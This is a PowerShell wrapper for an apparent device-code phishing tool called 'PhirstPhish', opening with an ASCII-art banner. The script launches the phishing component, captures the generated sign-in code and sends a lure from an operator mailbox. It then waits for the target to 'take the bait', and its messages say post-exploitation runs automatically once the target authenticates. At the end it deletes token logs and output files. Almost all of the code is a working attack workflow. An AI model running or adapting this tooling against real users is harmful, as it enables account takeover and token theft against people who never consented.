[CmdletBinding()]
param (
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$targetUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$firstUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$messageContent,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$subject,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$Token
)

$banner = @"
 --------------------------------------------------------------------------------------------------------------------- 
 --------------------------------------------------------------------------------------------------------------------- 
 --------------------------------------------------------------------------------------------------------------------- 
 ---------------------------+####+=----------------------------------------------------------------------------------- 
 -------------------------+%%%%%%%%#=--------------------------------------------------------------------------------- 
 ------------------------+%%%+--=#%%#--------------------------------------------------------------------------------- 
 ------------------------*%%#----+%%#=-------------------------------------------------------------------------------- 
 ------------------------=#%%#+=*%%%*--------------------------------------------------------------------------------- 
 -------------------------=#%%%%%%#+---------------------------------------------------------------------------------- 
 ----------------------------#%%#=------------------------------------------------------------------------------------ 
 ----------------------------#%%#------------------------------------------------------------------------------------- 
 ----------------------------#%%#------------------------------------------------------------------------------------- 
 ----------------------------#%%#------------------------------------------------------------------------------------- 
 ----------------------------#%%#------------------------------------------------------------------------------------- 
 ----------------------------*%%#------------------------------------------------------------------------------------- 
 ----------------------------+%%#------------------------------------------------------------------------------------- 
 ----------------------------+%%%=-----------------------#------------------------------------------------------------ 
 ----------------------------=%%%+----------------------+%------------------------------------------------------------ 
 -----------------------------%%%*---------------------=#%------------------------------------------------------------ 
 -----------------------------#%%#---------------------#%%------------------------------------------------------------ 
 -----------------------------=%%#=------------------=#%%#------------------------------------------------------------ 
 ------------------------------%%%*-----------------=#%%%*------------------------------------------------------------ 
 ------------------------------+%%#=----+##+-------=*+#%%+------------------------------------------------------------ 
 -------------------------------#%%#--=#%%%%%%#=-----+%%%------------------------------------------------------------- 
 -------------------------------=%%%*=*%%%%%%%%%%#=-=*%%+------------------------------------------------------------- 
 --------------------------------+%%%*-+%%%%%%%%%%%%#+---------------------------------------------------------------- 
 ---------------------------------+%%%#=-+*#%%%%%%%%%%%%*------------------------------------------------------------- 
 ----------------------------------=%%%%%*=---%%%%%%%%%%%%%#=--------------------------------------------------------- 
 --------------------------------=%+-+%%%%%*--+%%%%%%%%%%%%%%%+------------------------------------------------------- 
 -------------------------------+%%%#+-=#%#---*%%%%%%%%%%%%%%%#------------------------------------------------------- 
 ------------------------------+%%%%%%%#=----#%%%%%%%%%%%%%%%#-------------------------------------------------------- 
 -----------------------------*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%-+=------------------------------------------------------ 
 ----------------------------#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=-*%#+--------------------------------------------------- 
 ---------------------------#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*--+#%+------#%%#=---------------------------------- 
 --------------------------#%%%%%%%%%%%%%%%%%%%%%%#%%%%%%%%%%%%%%%#=-+#%#+#%%%%%%%#=---------------------------------- 
 -------------------------#%%%%%%%%%%%%%%%%%%%%%%%+##%%%%%%%%%%%%%%%#=-=#%%%%%%%%%%%#+-------------------------------- 
 ------------------------#%%%%%%%%%%%%%%%%%%%%+%%%%%%%%%+%%%%%%%%%%%%%%%%%+--*%%%%%%%%%%%%*--------------------------- 
 ----------------------=#%%%%%%%%%%%%%%%%%%%%%#=-+%%%%%%%%%-=%%%%%%%%%%%%%%%%*--+%%%%%%%%%%%%#=----------------------- 
 ---------------------=#%%%%%%%%%%%%%%%%%%%%%%%%%#+++=#%*-*#%%%%%%%  %%%% %%%%%#=-+#%%%%%%%%%%%#=--------------------- 
 --------------------=#%%%%%%%%%%%%%#=-=#%%%%%%%%%%*-----------------------%%%%%#=-+#%%%%%%%%%%%#=--------------------
 -------------------=#%%%%%%%%%%%%%%%%%#+--*%%%%%%%*---------------------%%%%%#=-+#%%%%%%%%%%%%%%%%#=-----------------
 -------------------#%%%%%%%%%%%%%%%%%%%------------------------------------=------+#%%%%%%%%%%%%%%%%#----------------
 ------------------%%%%%%%%%%%%%%%%  _ -  | |__ (_)_ __ ___| |_ _  _ | |   (_)___| |__  %%%%%#=-+#%%%%%#--------------
 -----------------#%%%%%%%%%%%%%%%% | '_ \| '_ \| | '__/ __| __| '_ \| '_ \| / __| '_ \  %%%%%#=-+#%%%%#--------------
 ----------------%%%%%%%%%%%%%%%%%% | |_) | | | | | |  \__ \ |_| |_) | | | | \__ \ | | | %%%%%#=-+#%%%#---------------
 -----------------#%%%%%%%%%%%%%%%% | .__/|_| |_|_|_|  |___/\__| .__/|_| |_|_|___/_| |_| %%%%%#=-+#%%#----------------
 -------------------%%%%%%%%%%%%%%% |_|------------------------|_|----------------------%%%%%%*=-+%%#-----------------
 ---------------------=#%%%%%%%%%%%%%%%%%%%%%%#=-=----------------------------%%%%%#=-+#%%%%%%%%%%%#=-----------------
 ------------------------=#%%%%%%%%%%%%%%%%%%%%%%#=-----------------------%%%%%#=-+#%%%%%%%%%%%%%#=-------------------
 ---------------------------=*%%%%%%%%%%%%%%%%%%%%#=--+-*%%=--+%%%%%%#==-===%#-+%%%%%%%%%%%%%%%%#=--------------------
 -------------------------------+%%%%%%%%%%%%%%%%%%%%%*-#%=-%%##+#%%%%%%%#-+*-+%%%%%%%%%%%%%%%%%+---------------------
 ----------------------------------=#%%%%%%%%%%%%%%%%%%%%==##+=+=#%%%%%%%%%%+-=#%%%%%%%%%%%%%%%+----------------------
 -------------------------------------=#%%%%%%%%%%%%%%%%%%%#+*=-=#%%%%%%%%%%%%##%%%%%%%%%%%%%#+-----------------------
 ----------------------------------------=*%%%%%%%%%%%%%%%%%%%%*=%%%%%%%%%%%%%%%%%%%%%%%%%%%#=------------------------ 
 -------------------------------------------=+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#=------------------------- 
 -----------------------------------------------+#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=-------------------------- 
 --------------------------------------------------=#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=--------------------------- 
 -----------------------------------------------------=*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#----------------------------- 
 --------------------------------------------------------=+%%%%%%%%%%%%%%%%%%%%%%%%%%%%#------------------------------ 
 ------------------------------------------------------------+#%%%%%%%%%%%%%%%%%%%%%%%#------------------------------- 
 ---------------------------------------------------------------+#%%%%%%%%%%%%%%%%%%%#-------------------------------- 
 ------------------------------------------------------------------=*%%%%%%%%%%%%%%%*--------------------------------- 
 ---------------------------------------------------------------------=+%%%%%%%%%%%*---------------------------------- 
 ------------------------------------------------------------------------=+#%%%%%%+----------------------------------- 
 ----------------------------------------------------------------------------=*#*=------------------------------------ 
 --------------------------------------------------------------------------------------------------------------------- 
 --------------------------------------------------------------------------------------------------------------------- 
 --------------------------------------------------------------------------------------------------------------------- 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% 
 %%%%%%%%%%%%%%%###%%############%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% 
 %%%%%%%%%%%%%############%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%##############################%%% 
 %%%%#####################%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%############################%%%% 
 %%%%%%%%%%%%%%%%%%###############%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% 
"@
Write-Host $banner

# Define the script and its parameters
$scriptPath = ".\PhirstPhish.ps1"
$scriptParams = "-targetUser $targetUser -messageContent $messageContent -subject $subject"

Write-Output "Starting PhirstPhish.ps1 in a separate process. Required modules all dependencies will be installed and capture the code generated for the template."
Write-Output "Be patient! Output will resume here when the code is generated, and you will prompted to sign in with your sender's account."

# Start the script in a new process
$process = Start-Process powershell -ArgumentList "$scriptPath $scriptParams" -PassThru -RedirectStandardOutput "output.txt" # -WindowStyle minimized

# Wait for the file to have content 
Start-Sleep -Seconds 1

# Continuously check the output file for the user code
$userCode = $null
while ($null -eq $userCode -and -not $process.HasExited) {
    $output = Get-Content "output.txt" -Tail 10 # Read the last 10 lines of the output
    foreach ($line in $output) {
        if ($line -match "user_code\s*:\s*(\S+)") {
            $userCode = $matches[1]
            break
        }
    }
    Start-Sleep -Seconds 1
}

Write-Output "$userCode" | Out-File .\user_code.txt
# Output the user code
Write-Host "User Code: $userCode"

Write-Output "Sign in with your sender's account here. Template will be sent from this mailbox."
.\Next.ps1 -firstUser $firstUser -code $userCode

Write-Output "Background process is polling endpoint for the authentication. If the user authenticates, automated post-exploitation will be performed inside that process."
# Write-Output "Script will continue when process exits."

$filePath = '.\switch.txt'
# Poll for the existence of the file
while (-not (Test-Path -Path $filePath)) {
    Write-Output "Checking for switch.txt.."
    Start-Sleep -Seconds 5 # Wait for 5 seconds before checking again
}

# Once the file exists, read its contents
Write-Output "File exists!"
$contents = Get-Content -Path $filePath

# Display the contents
Write-Output "$contents took the bait."

$process.WaitForExit()
$process | Stop-Process -Force -Confirm
# Remove our switch file
if(test-path .\switch.txt){ Remove-Item -force .\switch.txt } 

# $process.Kill()

Read-Host "Clean up and clear output?"
# $processes = Get-Process powershell | Sort-Object StartTime -Descending | Select-Object -First 1 | ForEach-Object { $_.Kill() }
if(test-path .\output.txt) { Remove-Item -force .\output.txt }
if(test-path .\user_code.txt) { Remove-Item -force .\user_code.txt }
if(test-path .\TokenLog.log) { Remove-Item -force .\TokenLog.log }
if(test-path *.json) { Remove-Item -force *.json }

$targetUser = ""
$firstUser = ""
$messageContent = "test"
$subject = ""

# wrapper1.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject

